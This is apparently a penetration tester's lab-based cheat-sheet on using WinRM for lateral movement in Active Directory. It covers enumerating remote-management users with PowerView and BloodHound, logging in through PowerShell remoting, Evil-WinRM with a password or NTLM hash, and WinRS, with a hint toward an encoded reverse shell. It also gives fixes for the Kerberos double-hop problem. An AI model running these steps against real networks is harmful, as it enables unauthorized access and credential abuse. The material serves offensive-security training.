---
title: WinRM
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 

> [!Requirements]
> Control over a user that belongs to the `Remote Management Users` group

1. Enumerate members of the `Remote Management Users` group on a host:

Using PowerView:
```powershell
PS C:\>  Import-Module .\PowerView.ps1
PS C:\> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

Using BloodHound custom query:
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

2. Access the target host:

Using WinRM from a Windows host:
```powershell
1. Create a PSCredential Object for storing the username and password:
PS C:\> $password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
PS C:\> $cred = new-object System.Management.Automation.PSCredential ("DOMAIN\USER", $password)

2. Access the remote target
PS C:\> Enter-PSSession -ComputerName TARGET_IP/HOSTNAME -Credential $cred

Alternative:
PS C:\> New-PSSession -ComputerName TARGET_IP/HOSTNAME -Credential $credential
PS C\> Enter-PSSession SESSION_ID
```

Using Evil-WinRM from a Linux host:
```shell
$ gem install evil-winrm
$ evil-winrm -i TARGET_IP -u USER -p PASSWORD

$ evil-winrm -i TARGET_IP -u USER -H NTLM_HASH
```

Using WinRS:
```powershell
PS C:\> winrs -r:TARGET_HOSTNAME -u:REMOTE_USER -p:REMOTE_PASSWORD  "cmd /c hostname & whoami" # use a base64 powershell encoded reverse shell to obtain RCE
```

> [!Note]
> - WinRS only works for domain users (we need a session with a domain user)
> - For WinRS to work, the domain user needs to be part of the `Administrators` or `Remote Management Users` group on the target host.

> [!Important]
> **Double Hop Problem**
> 
> When using WinRM as an authentication method to a target host, credentials for the user **wont be stored** in memory. This means that if we try to authenticate to a different resource from the WinrRM session, it will try to retrieve the NTLM hash stored in memory and wont be able to authenticate us. 
> 
> This means that if we access via RDP to a host, upload PowerView and try to enumerate the domain, we wont be able to do it because the users kerberos TGT is not sent to the WinRM session and we dont have a way to authenticate agains the DC so the commands wont work (PowerView enumerates the Domain by querying the DC).

---
# Double Hop Problem Solution
1. Use a PSCredential Object:

> [!Requirements]
> Working from an evil-winrm session on the pivot host

```powershell
# this will fail:
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn

*Evil-WinRM* PS C:\Users\backupadm\Documents> klist # we will only see cached kerberos tickets for our current server and not user

*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force

*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname # pass the credential alongside all the commands we make
```

2. Register PSSession Configuration

> [!Requirements]
> We have WinRM access to a domain-joined host or Windows attack host

```powershell
PS C:\> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm # establish a WinRM session on the accessible host

# this will fail
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 

# register a pssession on a new PS on the first host (not pivot)
PS C:\> Register-PSSessionConfiguration -Name SESSION_NAME -RunAsCredential inlanefreight\backupadm

# restart winrm session (it will close the previous session)
Restart-Service WinRM

# start a new session
PS C:\> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  SESSION_NAME
[DEV01]: PS C:\Users\backupadm\Documents> klist # we will have the user TGT ticket

[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname # we can now run PowerView from the session and query the DC
```
